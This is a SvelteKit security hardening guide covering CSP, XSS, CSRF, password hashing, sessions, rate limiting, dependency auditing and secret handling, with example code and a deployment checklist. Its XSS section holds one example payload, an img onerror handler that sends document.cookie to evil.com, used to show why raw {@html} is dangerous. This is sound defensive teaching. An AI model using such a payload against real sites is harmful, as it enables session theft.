# Security Hardening Guide

> A comprehensive guide to securing SvelteKit applications in production. Every section includes an explanation, working code, and the most common mistake to avoid.

---

## 1. Content Security Policy in SvelteKit

Content Security Policy (CSP) is an HTTP header that tells the browser which sources of content are trusted. It prevents XSS attacks by blocking inline scripts, unauthorized external scripts, and other content injection vectors.

### How CSP Works

When the browser receives a `Content-Security-Policy` header, it enforces a whitelist of allowed content sources. Any script, style, image, or connection that does not match the policy is blocked, and a violation report is sent to your reporting endpoint.

### Implementation in hooks.server.ts

```typescript
// src/hooks.server.ts
import type { Handle } from '@sveltejs/kit';
import { randomBytes } from 'crypto';

export const handle: Handle = async ({ event, resolve }) => {
  // Generate a unique nonce for each request
  const nonce = randomBytes(16).toString('base64');
  event.locals.cspNonce = nonce;

  const response = await resolve(event, {
    transformPageChunk: ({ html }) => {
      // Inject nonce into SvelteKit's inline scripts
      return html.replace(/%sveltekit.nonce%/g, nonce);
    }
  });

  // Set CSP header
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}'`,
    `style-src 'self' 'unsafe-inline'`,  // Svelte scoped styles need this
    `img-src 'self' data: https:`,
    `font-src 'self'`,
    `connect-src 'self'`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `report-uri /api/csp-report`,
    `report-to csp-endpoint`
  ].join('; ');

  response.headers.set('Content-Security-Policy', csp);

  // Additional security headers
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  response.headers.set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

  return response;
};
```

### CSP Reporting Endpoint

```typescript
// src/routes/api/csp-report/+server.ts
import { json } from '@sveltejs/kit';
import type { RequestHandler } from './$types';

export const POST: RequestHandler = async ({ request }) => {
  const report = await request.json();

  // Log to your monitoring service
  console.warn('CSP Violation:', {
    blockedUri: report['csp-report']?.['blocked-uri'],
    violatedDirective: report['csp-report']?.['violated-directive'],
    documentUri: report['csp-report']?.['document-uri']
  });

  // In production, send to Sentry, Datadog, or similar
  // await monitoringService.logCSPViolation(report);

  return json({ received: true });
};
```

### Nonce Configuration in svelte.config.js

```javascript
// svelte.config.js
export default {
  kit: {
    csp: {
      directives: {
        'script-src': ['self']
      },
      // Use nonce mode for inline scripts
      mode: 'nonce'
    }
  }
};
```

### Common Mistake

Using `'unsafe-inline'` for `script-src` defeats the purpose of CSP entirely. It allows any inline `<script>` tag to execute, including injected XSS payloads. Always use nonces for inline scripts. The `'unsafe-inline'` directive for `style-src` is more acceptable because CSS injection has a much smaller attack surface than script injection, and Svelte's scoped styles are inline by default.

---

## 2. XSS Prevention

Cross-Site Scripting (XSS) is the most common web vulnerability. An attacker injects malicious JavaScript that executes in another user's browser, stealing cookies, session tokens, or performing actions on the user's behalf.

### Why {@html} Is Dangerous

Svelte's `{expression}` syntax automatically escapes HTML entities. The text `<script>alert('xss')</script>` is rendered as literal text, not executed. But `{@html expression}` renders raw HTML, bypassing all escaping.

```svelte
<script lang="ts">
  // DANGEROUS — user controls the content
  let userComment = $state('<img src=x onerror="fetch(`https://evil.com/steal?cookie=${document.cookie}`)" />');
</script>

<!-- This executes the attack -->
{@html userComment}

<!-- This is safe — automatically escaped -->
{userComment}
```

### DOMPurify Integration

```svelte
<script lang="ts">
  import DOMPurify from 'dompurify';

  let { rawContent }: { rawContent: string } = $props();

  // Sanitize with a strict allowlist
  let safeHtml = $derived(
    DOMPurify.sanitize(rawContent, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h2', 'h3', 'code', 'pre'],
      ALLOWED_ATTR: ['href', 'target', 'rel'],
      ALLOW_DATA_ATTR: false,
      ADD_ATTR: ['rel'],  // force rel attribute
      FORCE_BODY: true
    })
  );
</script>

{@html safeHtml}
```

### Content-Type Headers on API Routes

API routes that return user-generated content must set proper Content-Type headers to prevent browsers from interpreting the response as HTML.

```typescript
// src/routes/api/comments/[id]/+server.ts
import { json } from '@sveltejs/kit';

export const GET = async ({ params }) => {
  const comment = await db.comment.findUnique({ where: { id: params.id } });

  // ALWAYS use json() — never return raw HTML strings
  return json({
    id: comment.id,
    // Escape for JSON context — DOMPurify handles HTML rendering
    text: comment.text,
    author: comment.authorName
  });
};
```

### Common Mistake

Sanitizing on output instead of sanitizing before storage AND on output. You should sanitize when rendering (`$derived` with DOMPurify) because sanitization rules may change over time. But also validate and reject obviously malicious input at the API boundary — do not store `<script>` tags in your database if your field should only contain plain text.

---

## 3. CSRF Protection

Cross-Site Request Forgery (CSRF) tricks a user's browser into submitting a request to your application from a malicious site. Because the browser automatically includes cookies, the request appears to come from the authenticated user.

### SvelteKit's Built-In Origin Check

SvelteKit automatically checks the `Origin` header on form submissions and rejects requests that do not originate from your domain. This is enabled by default — you do not need to configure it.

```typescript
// svelte.config.js — origin check is ON by default
export default {
  kit: {
    csrf: {
      checkOrigin: true  // default
    }
  }
};
```

### Custom CSRF Tokens for API Routes

SvelteKit's origin check only applies to form actions. API routes (`+server.ts`) that accept POST/PUT/DELETE requests need manual CSRF protection if they are called from forms or JavaScript on the page.

```typescript
// src/lib/server/csrf.ts
import { randomBytes } from 'crypto';

export function generateCsrfToken(): string {
  return randomBytes(32).toString('hex');
}

export function validateCsrfToken(
  requestToken: string | null,
  sessionToken: string | null
): boolean {
  if (!requestToken || !sessionToken) return false;
  // Constant-time comparison to prevent timing attacks
  if (requestToken.length !== sessionToken.length) return false;

  let mismatch = 0;
  for (let i = 0; i < requestToken.length; i++) {
    mismatch |= requestToken.charCodeAt(i) ^ sessionToken.charCodeAt(i);
  }
  return mismatch === 0;
}
```

```typescript
// src/hooks.server.ts — set CSRF token in cookie
import { generateCsrfToken } from '$lib/server/csrf';

export const handle: Handle = async ({ event, resolve }) => {
  if (!event.cookies.get('csrf')) {
    event.cookies.set('csrf', generateCsrfToken(), {
      path: '/',
      httpOnly: true,
      sameSite: 'strict',
      secure: !dev
    });
  }
  return resolve(event);
};
```

### SameSite Cookies

The `SameSite` cookie attribute is a critical CSRF defense. It controls when the browser sends cookies in cross-origin requests.

```typescript
cookies.set('session', token, {
  path: '/',
  httpOnly: true,
  sameSite: 'lax',    // sent on top-level navigations, not on cross-origin POST
  // sameSite: 'strict' // never sent cross-origin — more secure but breaks OAuth redirect flows
  secure: true
});
```

- `SameSite=Strict`: Cookie is never sent cross-origin. Most secure, but breaks flows where users arrive from external links.
- `SameSite=Lax`: Cookie is sent on top-level GET navigations but not on POST, PUT, DELETE, or iframe requests. Good balance of security and usability.
- `SameSite=None; Secure`: Cookie is sent on all cross-origin requests. Required for third-party authentication providers but weakens CSRF protection.

### Common Mistake

Disabling `checkOrigin` in `svelte.config.js` because it "causes errors during development." The origin check is there to protect your users. If it fails during development, the issue is usually that your dev server's origin does not match the expected origin. Fix the development configuration, not the security configuration.

---

## 4. Authentication Security

Authentication is the most security-critical code in your application. A single mistake can compromise every user account.

### Password Hashing

Never store passwords in plain text. Always hash with a slow, memory-hard algorithm designed for password storage.

```typescript
// src/lib/server/auth.ts
import { hash, verify } from '@node-rs/argon2';
import { randomBytes } from 'crypto';

// Argon2id — recommended by OWASP for password hashing
export async function hashPassword(password: string): Promise<string> {
  return hash(password, {
    memoryCost: 65536,    // 64 MB memory
    timeCost: 3,          // 3 iterations
    parallelism: 4,       // 4 parallel threads
    outputLen: 32         // 32 byte output
  });
}

export async function verifyPassword(
  hash: string,
  password: string
): Promise<boolean> {
  return verify(hash, password);
}

// Session token generation — 256 bits of entropy
export function generateSessionToken(): string {
  return randomBytes(32).toString('hex');
}
```

**Algorithm comparison:**
- **Argon2id** (recommended): Memory-hard, resists GPU attacks, configurable cost parameters. Winner of the Password Hashing Competition. Use this.
- **bcrypt**: Well-tested but limited to 72 bytes input and not memory-hard. Still acceptable but being superseded.
- **PBKDF2**: Available in Node.js crypto natively. Not memory-hard. Acceptable only if Argon2 and bcrypt are unavailable.
- **SHA-256 / MD5**: NEVER use for passwords. These are fast hashes designed for data integrity, not password storage. A GPU can crack billions of SHA-256 hashes per second.

### Session Management

```typescript
// src/lib/server/session.ts
import { db } from '$lib/server/db';
import { generateSessionToken } from '$lib/server/auth';

export async function createSession(userId: string): Promise<string> {
  const token = generateSessionToken();
  const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days

  await db.session.create({
    data: {
      token,          // store the hash in production: hashToken(token)
      userId,
      expiresAt,
      createdAt: new Date(),
      ipAddress: null, // set from request in production
      userAgent: null  // set from request in production
    }
  });

  return token;
}

export async function validateSession(token: string) {
  const session = await db.session.findUnique({
    where: { token },
    include: { user: true }
  });

  if (!session || session.expiresAt < new Date()) {
    if (session) await db.session.delete({ where: { id: session.id } });
    return null;
  }

  // Extend session on active use (sliding window)
  if (session.expiresAt.getTime() - Date.now() < 15 * 24 * 60 * 60 * 1000) {
    await db.session.update({
      where: { id: session.id },
      data: { expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000) }
    });
  }

  return session;
}
```

### Cookie Configuration for Sessions

```typescript
// In hooks.server.ts or login action
cookies.set('session', token, {
  path: '/',
  httpOnly: true,     // JavaScript cannot read the cookie (prevents XSS theft)
  secure: true,       // Only sent over HTTPS
  sameSite: 'lax',    // CSRF protection
  maxAge: 60 * 60 * 24 * 30  // 30 days
});
```

### Session Fixation Prevention

Session fixation attacks occur when an attacker sets a known session ID before the user logs in, then hijacks the session after login. Prevent this by always generating a new session token after successful authentication.

```typescript
// After successful login — always create a NEW session
export const actions = {
  login: async ({ request, cookies }) => {
    // ... validate credentials ...

    // Delete any existing session (prevents fixation)
    const oldToken = cookies.get('session');
    if (oldToken) {
      await db.session.deleteMany({ where: { token: oldToken } });
    }

    // Create a brand new session with a new token
    const newToken = await createSession(user.id);
    cookies.set('session', newToken, { /* ... */ });

    redirect(303, '/dashboard');
  }
};
```

### Common Mistake

Storing the session token in `localStorage` instead of an `httpOnly` cookie. `localStorage` is accessible from any JavaScript on the page — an XSS vulnerability instantly becomes a full session hijack. `httpOnly` cookies cannot be read by JavaScript, so even if an attacker achieves XSS, they cannot steal the session token.

---

## 5. Rate Limiting

Rate limiting prevents brute force attacks (password guessing), denial of service, and API abuse. Without rate limiting, an attacker can try thousands of passwords per second against your login endpoint.

### In-Memory Rate Limiter in hooks.server.ts

```typescript
// src/lib/server/rate-limit.ts

interface RateLimitEntry {
  count: number;
  resetAt: number;
}

export class RateLimiter {
  private store = new Map<string, RateLimitEntry>();
  private readonly maxRequests: number;
  private readonly windowMs: number;

  constructor(maxRequests: number, windowMs: number) {
    this.maxRequests = maxRequests;
    this.windowMs = windowMs;

    // Clean up expired entries every minute
    setInterval(() => this.cleanup(), 60_000);
  }

  check(key: string): { allowed: boolean; remaining: number; resetIn: number } {
    const now = Date.now();
    const entry = this.store.get(key);

    if (!entry || now > entry.resetAt) {
      this.store.set(key, { count: 1, resetAt: now + this.windowMs });
      return { allowed: true, remaining: this.maxRequests - 1, resetIn: this.windowMs };
    }

    if (entry.count >= this.maxRequests) {
      return {
        allowed: false,
        remaining: 0,
        resetIn: entry.resetAt - now
      };
    }

    entry.count++;
    return {
      allowed: true,
      remaining: this.maxRequests - entry.count,
      resetIn: entry.resetAt - now
    };
  }

  private cleanup() {
    const now = Date.now();
    for (const [key, entry] of this.store) {
      if (now > entry.resetAt) {
        this.store.delete(key);
      }
    }
  }
}
```

### Applying Rate Limits in Hooks

```typescript
// src/hooks.server.ts
import { RateLimiter } from '$lib/server/rate-limit';

// Different limits for different endpoints
const loginLimiter = new RateLimiter(5, 15 * 60 * 1000);   // 5 attempts per 15 min
const apiLimiter = new RateLimiter(100, 60 * 1000);         // 100 requests per minute
const globalLimiter = new RateLimiter(1000, 60 * 1000);     // 1000 requests per minute

export const handle: Handle = async ({ event, resolve }) => {
  const ip = event.getClientAddress();

  // Global rate limit
  const globalCheck = globalLimiter.check(ip);
  if (!globalCheck.allowed) {
    return new Response('Too many requests', {
      status: 429,
      headers: {
        'Retry-After': String(Math.ceil(globalCheck.resetIn / 1000)),
        'X-RateLimit-Remaining': '0'
      }
    });
  }

  // Stricter limit on login endpoint
  if (event.url.pathname === '/login' && event.request.method === 'POST') {
    const loginCheck = loginLimiter.check(ip);
    if (!loginCheck.allowed) {
      return new Response('Too many login attempts. Try again later.', {
        status: 429,
        headers: { 'Retry-After': String(Math.ceil(loginCheck.resetIn / 1000)) }
      });
    }
  }

  // API rate limit
  if (event.url.pathname.startsWith('/api/')) {
    const apiCheck = apiLimiter.check(ip);
    if (!apiCheck.allowed) {
      return new Response(JSON.stringify({ error: 'Rate limit exceeded' }), {
        status: 429,
        headers: {
          'Content-Type': 'application/json',
          'Retry-After': String(Math.ceil(apiCheck.resetIn / 1000)),
          'X-RateLimit-Remaining': String(apiCheck.remaining)
        }
      });
    }
  }

  return resolve(event);
};
```

### IP-Based vs Session-Based Rate Limiting

- **IP-based:** Simple, catches unauthenticated attacks. But shared IPs (corporate networks, VPNs) can unfairly limit legitimate users. Use for login endpoints and public API routes.
- **Session-based:** Tracks rate per authenticated user. More accurate but requires authentication to be established first. Use for authenticated API routes.
- **Sliding window:** The implementation above uses a fixed window (count resets at a specific time). A true sliding window tracks individual request timestamps and provides smoother rate limiting. The fixed window is simpler and sufficient for most applications.

### Common Mistake

Only rate limiting the login form and forgetting API routes. If your login form submits to a form action, but you also have a `POST /api/auth/login` endpoint, attackers will use the API endpoint instead. Rate limit both. Also consider rate limiting password reset, email verification, and any endpoint that triggers external actions (sending emails, SMS).

---

## 6. Dependency Auditing

Your application's security is only as strong as its weakest dependency. A single compromised package in your dependency tree can inject malicious code into your production build.

### pnpm audit

```bash
# Check for known vulnerabilities
pnpm audit

# Only production dependencies (skip devDependencies)
pnpm audit --prod

# Fix automatically where possible
pnpm audit --fix

# Generate a JSON report for CI/CD
pnpm audit --json > audit-report.json
```

### Dependabot / Renovate Configuration

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    # Group minor and patch updates
    groups:
      production-deps:
        patterns:
          - "*"
        update-types:
          - "minor"
          - "patch"
```

### Lockfile Integrity

The `pnpm-lock.yaml` file is a security artifact. It pins exact versions and includes integrity hashes for every package. Always commit it to version control and review changes to it in pull requests.

```bash
# Verify lockfile integrity
pnpm install --frozen-lockfile  # CI: fail if lockfile is out of date

# In CI/CD pipeline — always use frozen lockfile
pnpm install --frozen-lockfile
```

### Supply Chain Risks

Supply chain attacks target the build pipeline, not the runtime. Mitigations include:

1. **Pin exact versions** in `package.json` (avoid `^` and `~` in production dependencies)
2. **Review lockfile diffs** in every PR — a changed lockfile hash means different code is being installed
3. **Use `pnpm install --frozen-lockfile`** in CI to prevent surprise updates
4. **Audit new dependencies** before adding them — check npm page for recent maintainer changes, download trends, and GitHub issues
5. **Consider `pnpm.overrides`** to patch transitive dependency vulnerabilities without waiting for upstream fixes

### Common Mistake

Ignoring `pnpm audit` warnings because they are in devDependencies. While devDependency vulnerabilities do not ship to production, they can compromise your development environment. A malicious Vite plugin or PostCSS transform can inject code during the build process that ends up in production output.

---

## 7. Environment Variable Safety

SvelteKit has a deliberate boundary between server-side and client-side environment variables. Understanding this boundary is critical for preventing secret leakage.

### The $env Boundary

```
$env/static/private   → Only available in server-side code (.server.ts files)
$env/static/public    → Available everywhere (PUBLIC_ prefix required)
$env/dynamic/private  → Server-side, read at runtime (not inlined at build)
$env/dynamic/public   → Everywhere, read at runtime
```

```typescript
// Server-side only — NEVER reaches the client bundle
import { DATABASE_URL, API_SECRET } from '$env/static/private';

// Available on client AND server — prefix with PUBLIC_
import { PUBLIC_API_URL } from '$env/static/public';
```

### What Leaks to the Client

These are visible in the client-side JavaScript bundle and browser DevTools:

1. **`$env/static/public`** — by design, for public configuration
2. **`import.meta.env.VITE_*`** — legacy Vite prefix, inlined at build time
3. **`$env/dynamic/public`** — runtime public config
4. **Any value passed through `load()` return** — serialized and sent to client
5. **Any value rendered in HTML** — visible in page source

These are server-only and never reach the client:

1. **`$env/static/private`** — SvelteKit errors if imported in client code
2. **`$env/dynamic/private`** — runtime server-only config
3. **Values used in `+page.server.ts` / `+server.ts`** — never serialized unless returned

### .env.example Pattern

```bash
# .env.example — commit this to version control
# Copy to .env and fill in real values
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
API_SECRET=your-api-secret-here
PUBLIC_API_URL=http://localhost:3000/api
SMTP_HOST=smtp.example.com
SMTP_USER=
SMTP_PASS=
```

```gitignore
# .gitignore — NEVER commit real .env files
.env
.env.local
.env.production
.env.*.local
```

### Common Mistake

Passing secrets through load functions. Even in `+page.server.ts`, the return value is serialized and sent to the client for hydration. If you return `{ apiKey: API_SECRET }`, that secret is in the page's HTML source. Server load functions return data, and all returned data is client-visible. Keep secrets in server-only code and never include them in load function return values.

---

## 8. Production Security Checklist

Use this 20-item checklist before every production deployment. Each item should be verified, not assumed.

### HTTP Headers

- [ ] **Content-Security-Policy** is set with script-src using nonces, not `unsafe-inline`
- [ ] **X-Frame-Options** is set to `DENY` (or `SAMEORIGIN` if you use iframes)
- [ ] **X-Content-Type-Options** is set to `nosniff`
- [ ] **Referrer-Policy** is set to `strict-origin-when-cross-origin`
- [ ] **Permissions-Policy** restricts camera, microphone, geolocation to `()`
- [ ] **Strict-Transport-Security** is set with `max-age=63072000; includeSubDomains`

### Cookies

- [ ] All session cookies use `httpOnly: true`
- [ ] All session cookies use `secure: true`
- [ ] All session cookies use `sameSite: 'lax'` or `'strict'`
- [ ] Session cookies have a reasonable `maxAge` (not infinite)
- [ ] Cookie names do not reveal technology stack (avoid `PHPSESSID`, `connect.sid`)

### Secrets and Configuration

- [ ] `.env` files are in `.gitignore` and not committed to version control
- [ ] No secrets are returned from `load()` functions or API responses
- [ ] `$env/static/private` is used for all server secrets (never `VITE_` prefix for secrets)
- [ ] Database credentials use connection pooling with limited max connections

### Application Security

- [ ] Rate limiting is configured for login, registration, and password reset endpoints
- [ ] CSRF protection is enabled (`checkOrigin: true` in svelte.config.js — the default)
- [ ] All `{@html}` usages are sanitized with DOMPurify or equivalent
- [ ] `pnpm audit` shows no high or critical vulnerabilities
- [ ] Error pages do not leak stack traces, file paths, or internal details

### Monitoring

- [ ] CSP violation reports are collected and monitored
- [ ] Failed login attempts are logged with IP and timestamp (for detecting brute force)
- [ ] Application errors are sent to a monitoring service (Sentry, Datadog, etc.)
- [ ] Dependencies are automatically checked for vulnerabilities (Dependabot, Renovate)

### Periodic Review

- [ ] Rotate API keys and secrets at least quarterly
- [ ] Review and prune unused npm dependencies
- [ ] Audit `pnpm.overrides` for stale entries
- [ ] Test that rate limiting actually blocks attacks (run a simple script against your login endpoint)
- [ ] Verify CSP headers have not been weakened by recent changes

---

*Security is not a feature — it is a requirement. Every section in this guide represents a real attack vector that has been exploited in production applications. Implement all of them, not just the ones that seem relevant. The attack you do not prepare for is the one that succeeds.*
